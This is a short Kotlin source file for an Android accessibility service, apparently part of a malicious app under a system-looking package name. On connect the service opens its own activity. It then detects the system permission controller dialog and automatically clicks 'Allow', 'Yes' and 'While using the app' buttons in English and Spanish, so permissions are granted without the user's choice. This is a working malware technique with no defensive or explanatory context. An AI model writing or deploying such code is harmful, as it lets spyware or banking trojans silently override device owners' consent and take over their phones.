package com.sys.sun

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class SunAccess : AccessibilityService() {
    
    override fun onServiceConnected() {
        super.onServiceConnected()
        val intent = Intent(this, MainActivity::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event?.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val pkg = event.packageName?.toString() ?: return
            if (pkg == "com.android.permissioncontroller" || pkg == "com.google.android.permissioncontroller") {
                autoGrantPermissions()
            }
        }
    }

    private fun autoGrantPermissions() {
        val root = rootInActiveWindow ?: return
        val texts = listOf("Permitir", "Allow", "Mientras uso la app", "While using the app", "Sí", "Yes")
        for (text in texts) {
            val nodes = root.findAccessibilityNodeInfosByText(text)
            for (node in nodes) {
                if (node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Thread.sleep(500)
                    return
                }
            }
        }
    }
    override fun onInterrupt() {}
}
